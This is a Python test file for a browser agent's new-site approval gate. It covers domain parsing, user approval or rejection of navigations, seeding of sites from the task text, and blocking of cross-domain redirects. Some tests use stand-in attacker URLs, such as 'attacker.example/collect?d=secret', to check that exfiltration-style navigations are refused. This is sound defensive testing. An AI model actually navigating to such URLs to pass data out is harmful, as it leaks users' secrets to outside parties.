"""New-site confirmation for the browser agent (B10 follow-up to PR 9):
registrable domains (shared vectors with Rust), seeds from the user's text,
approvals for agent and page-initiated navigations, binding, single use."""
from __future__ import annotations

import threading
from pathlib import Path

import pytest

from ops_dashboard.evals.web import EvalBridge
from ops_dashboard.sessions import SessionStore, providers
from ops_dashboard.sessions import browser as sb
from ops_dashboard.sessions import browser_effects as fx

ROOT = Path(__file__).resolve().parent.parent
VECTORS = ROOT / "desktop" / "url-policy" / "tests" / "site_vectors.txt"
SHOP = "https://shop.example/lamp"
PAGES = {
    SHOP: {"url": SHOP, "title": "Lamp", "text": "10 EUR", "elements": [
        {"ref": 1, "tag": "a", "name": "Details", "href": "https://shop.example/lamp/details"},
        {"ref": 2, "tag": "a", "name": "Partner", "href": "https://partner.example/"}]},
    "https://shop.example/lamp/details": {"title": "Details", "text": "40 cm", "elements": []},
    "https://docs.example/": {"title": "Docs", "text": "manual", "elements": []},
}


@pytest.fixture(autouse=True)
def _fast(monkeypatch):
    providers.reset_cooldowns()
    monkeypatch.setattr(sb, "APPROVAL_TIMEOUT_S", 1.0)
    monkeypatch.setattr(sb, "APPROVAL_POLL_S", 0.005)
    yield
    providers.reset_cooldowns()


@pytest.fixture()
def store(tmp_path, monkeypatch):
    dbp = tmp_path / "n.db"
    monkeypatch.setenv("CONDUCTLOOP_DB_PATH", str(dbp))
    from ops_dashboard import db
    monkeypatch.setattr(db, "DB_PATH", dbp)
    db.init_db()
    return SessionStore()


def session(store, mode="act"):
    return sb.create_browser_session(store, name="b", role="browser", provider="openai", model="m",
                                     budget_cost_cents=1000, browser_mode=mode)


def user(store, sid, decision, *, before=None):
    def go():
        for _ in range(400):
            rows = sb.pending_browser_approvals(store, sid)
            if rows:
                if before:
                    before()
                sb.resolve_browser_approval(store, rows[0]["id"], sid, decision)
                return
            threading.Event().wait(0.005)
    t = threading.Thread(target=go, daemon=True)
    t.start()
    return t


def bridge(**kw):
    return EvalBridge({k: dict(v) for k, v in PAGES.items()}, start=kw.pop("start", SHOP), **kw)


# ── registrable domains ──────────────────────────────────────────────────────

def test_python_registrable_domain_matches_shared_vectors():
    n = 0
    for line in VECTORS.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        host, want = (x.strip() for x in line.split("=>"))
        assert fx.registrable_domain(host) == want, line
        n += 1
    assert n >= 20


def test_suffix_lists_match_rust():
    import re
    rs = (ROOT / "desktop" / "url-policy" / "src" / "sites.rs").read_text()
    block = rs[rs.index("MULTI_LABEL_SUFFIXES"):]
    block = block[:block.index("];")]
    assert tuple(re.findall(r'"([a-z0-9.\-]+)"', block)) == fx.MULTI_LABEL_SUFFIXES


def test_gate_and_helpers():
    assert fx.nav_needs_confirm({"example.com"}, "https://www.example.com/x") is None
    assert fx.nav_needs_confirm({"example.com"}, "https://evil.net/?u=example.com") == "evil.net"
    assert fx.nav_needs_confirm(set(), "about:blank") is None
    assert fx.http_host("https://u:p@[::1]:8/x") == "::1"
    assert sb._with_scheme("docs.example/a") == "https://docs.example/a"
    assert sb._with_scheme("localhost:7777") == "https://localhost:7777"
    assert sb._with_scheme("http://x.example") == "http://x.example"
    hosts = sb._hosts_in("see https://Docs.Example/a, also news.bbc.co.uk. not me@mail.example or v1.2")
    assert hosts == ["Docs.Example", "news.bbc.co.uk"]


# ── BrowserTools ──────────────────────────────────────────────────────────────

def test_agent_navigation_to_new_site_needs_approval(store):
    sid = session(store, "read")
    br = bridge()
    t = sb.BrowserTools(store, sid, bridge=br)  # type: ignore[arg-type]
    user(store, sid, "reject")
    r = t.navigate("https://attacker.example/collect?d=secret")
    assert not r["ok"] and "attacker.example" in r["error"]
    assert not [x for x in br.executed if "attacker" in x["url"]]
    # Refused sites are not asked again in the same task.
    assert "already refused" in t.navigate("https://attacker.example/2")["error"]
    rows = [e for e in store.list_events(sid) if e["kind"] == "browser.approval_rejected"]
    assert len(rows) == 1


def test_approved_site_once_then_free(store):
    sid = session(store, "read")
    br = bridge()
    t = sb.BrowserTools(store, sid, bridge=br)  # type: ignore[arg-type]
    user(store, sid, "approve")
    assert t.navigate("https://docs.example/")["ok"]
    assert t.navigate("https://docs.example/2")["ok"]     # same site: no new approval
    navs = [c for c in br.calls if c["op"] == "navigate"]
    assert navs[0].get("confirmed") is True and not navs[-1].get("confirmed")
    from ops_dashboard import db
    conn = db.get_connection()
    n = conn.execute("SELECT COUNT(*) FROM agent_logs WHERE action='approval_proposed'").fetchone()[0]
    conn.close()
    assert n == 1


def test_sites_named_by_the_user_need_no_approval(store):
    sid = session(store, "read")
    br = bridge()
    t = sb.BrowserTools(store, sid, bridge=br)  # type: ignore[arg-type]
    t.seed_sites("please read the manual at docs.example")
    assert t.navigate("docs.example")["ok"]
    assert sb.pending_browser_approvals(store, sid) == []
    assert "docs.example" in br.sites      # seeds reached the (emulated) Rust tab


def test_first_open_binds_to_no_tab(store):
    sid = session(store, "read")
    br = EvalBridge({k: dict(v) for k, v in PAGES.items()})
    t = sb.BrowserTools(store, sid, bridge=br)  # type: ignore[arg-type]
    user(store, sid, "approve")
    assert t.open("https://docs.example/")["ok"]
    ev = [e for e in store.list_events(sid) if e["kind"] == "browser.approval_pending"]
    assert ev and br.executed[0]["op"] == "open"


def test_approval_void_if_page_changed(store):
    sid = session(store, "read")
    br = bridge()
    t = sb.BrowserTools(store, sid, bridge=br)  # type: ignore[arg-type]

    def change():
        br.pages[SHOP]["elements"] = [{"ref": 9, "tag": "a", "name": "New"}]
    user(store, sid, "approve", before=change)
    r = t.navigate("https://docs.example/")
    assert not r["ok"] and "changed after approval" in r["error"]
    assert br.url == SHOP


def test_click_that_leaves_for_a_new_site_is_stopped_and_asked(store):
    sid = session(store)
    br = bridge(links={SHOP: {"1": "https://shop.example/lamp/details"}},
                redirects={"https://shop.example/lamp/details": "https://attacker.example/x"})
    t = sb.BrowserTools(store, sid, bridge=br)  # type: ignore[arg-type]
    assert t.read()["ok"]
    user(store, sid, "reject")
    r = t.click(1)
    assert r["ok"] and r["navigation"]["ok"] is False
    assert r["navigation"]["url"] == "https://attacker.example/x"
    assert br.url == "https://shop.example/lamp/details"
    assert not [x for x in br.executed if "attacker" in x["url"]]


def test_approved_cross_domain_link_is_one_approval(store):
    sid = session(store)
    br = bridge(links={SHOP: {"2": "https://partner.example/"}})
    t = sb.BrowserTools(store, sid, bridge=br)  # type: ignore[arg-type]
    assert t.read()["ok"]
    user(store, sid, "approve")
    r = t.click(2)
    assert r["ok"] and "navigation" not in r and br.url == "https://partner.example/"


def test_off_site_page_is_not_read(store):
    sid = session(store, "read")
    br = bridge()
    br.url = "https://landed.example/"          # e.g. a redirect Rust only saw at page load
    t = sb.BrowserTools(store, sid, bridge=br)  # type: ignore[arg-type]
    r = t.read()
    assert not r["ok"] and "not opened in the session" in r["error"]


def test_runner_seeds_sites_from_task(store):
    import json

    from ops_dashboard.sessions.browser_runner import BrowserRunner
    store.set_model_price("openai", "m", in_cents_per_mtok=0, out_cents_per_mtok=1)
    sid = session(store, "read")
    br = EvalBridge({k: dict(v) for k, v in PAGES.items()})

    class P:
        name, model, last_usage = "openai", "m", None
        turns = [{"tool": "open", "args": {"url": "https://docs.example/"}}, {"final": "ok"}]

        def ask(self, system, messages, **kw):
            return json.dumps(self.turns.pop(0))

    store.enqueue_task(title="t", prompt="read https://docs.example/ for me", assigned_session_id=sid)
    task = store.claim_task(sid)
    out = BrowserRunner(store, sid, provider_factory=lambda s: P(), bridge=br).run_task(task)  # type: ignore[arg-type]
    assert out.task_status == "needs_review"
    assert sb.pending_browser_approvals(store, sid) == [] and br.executed[0]["op"] == "open"


def test_rust_side_has_the_gate():
    src = (ROOT / "desktop" / "src-tauri" / "src")
    b = (src / "browser.rs").read_text()
    a = (src / "agent_bridge.rs").read_text()
    assert "gate_navigation(&app_nav, &label_nav" in b and "fn off_site" in b
    assert 'err("confirmation_required:new_site")' in a and 'err("off_site")' in a
    assert 'Effect::Confirm("cross_domain")' in a
